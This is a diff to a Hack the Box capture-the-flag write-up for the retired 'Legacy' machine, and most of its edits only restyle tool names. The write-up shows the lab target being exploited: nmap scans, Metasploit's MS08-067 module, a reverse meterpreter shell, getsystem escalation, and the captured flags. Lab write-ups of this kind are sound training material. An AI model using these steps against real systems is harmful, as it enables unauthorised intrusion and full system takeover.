@@ -15,7 +15,7 @@ author: Tyler Butler
 Legacy is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.
 
 ## Getting Started   
-The first thing i did was conduct a basic nmap scan to search for the top 200 open ports on the target.  
+The first thing i did was conduct a basic <kbd>nmap</kbd> scan to search for the top 200 open ports on the target.  
 
 ```bash
 ──(kali㉿kali)-[~/Documents/htb/legacy]
@@ -34,7 +34,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds
                                                                                                                                                           
 ```  
 
-The scan shows there are at least 2 open ports with services such as netbios and microsoft-ds running. Next, to get a better understanding of the services and version running, and to scan for basic vulnerabilities, I used the nmapAutomator script.  The below output only shows the most relevant information.  
+The scan shows there are at least 2 open ports with services such as netbios and microsoft-ds running. Next, to get a better understanding of the services and version running, and to scan for basic vulnerabilities, I used the <kbd>nmapAutomator</kbd> script.  The below output only shows the most relevant information.  
 
 ```bash
 ---------------------Starting Nmap Vulns Scan---------------------
@@ -107,7 +107,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 54.12 seconds
 ```  
 
-The scan shows the target is likely vulnerable to CVE-2008-4250, a serious vulnerability also referred to by its [microsoft bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) identifier, Microsoft Windows Server 2000/2003 - Code Execution (MS08-067). There is a public exploit for this vulnerability on metasploit (exploit/windows/smb/ms08_067_netapi), so next i started up the msfconsole and configured the necessary options.  
+The scan shows the target is likely vulnerable to CVE-2008-4250, a serious vulnerability also referred to by its [microsoft bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) identifier, Microsoft Windows Server 2000/2003 - Code Execution (MS08-067). There is a public exploit for this vulnerability on metasploit (exploit/windows/smb/ms08_067_netapi), so next i started up the <kbd>msfconsole</kbd> and configured the necessary options.  
 
 ```bash
 msf6 exploit(windows/smb/ms08_067_netapi) > show options
@@ -140,7 +140,7 @@ Exploit target:
 msf6 exploit(windows/smb/ms08_067_netapi) > 
 ```  
 
-Executing the exploit started a reverse meterpreter session on the target. Using the `getsystem` meterpreter command, I upgraded my privilege to SYSTEM. At this point I can start looking for the user and root flags.  
+Executing the exploit started a reverse meterpreter session on the target. Using the <kbd>getsystem</kbd> meterpreter command, I upgraded my privilege to SYSTEM. At this point I can start looking for the user and root flags.  
 
 ```bash
 msf6 exploit(windows/smb/ms08_067_netapi) > exploit
@@ -158,7 +158,7 @@ meterpreter > getsystem
 meterpreter > 
 ```  
 
-I used the `search` meterpreter command and found both flags. 
+I used the <kbd>search</kbd> meterpreter command and found both flags. 
 
 ```bash
 meterpreter > search -f *user.txt*
@@ -167,7 +167,6 @@ Found 1 result...
 meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
 e69af0e4f443de7e36876fda4ec7644fmeterpreter > 
 ```  
-
 ```bash
 meterpreter > search -f *root.txt*
 Found 1 result...
@@ -175,7 +174,6 @@ Found 1 result...
 meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
 993442d258b0e0ec917cae9e695d5713meterpreter > 
 ```  
-
 ## Conclusion  
 Overall this was an easy CTF machine that was vulnerable to a very popular windows exploit.  
 
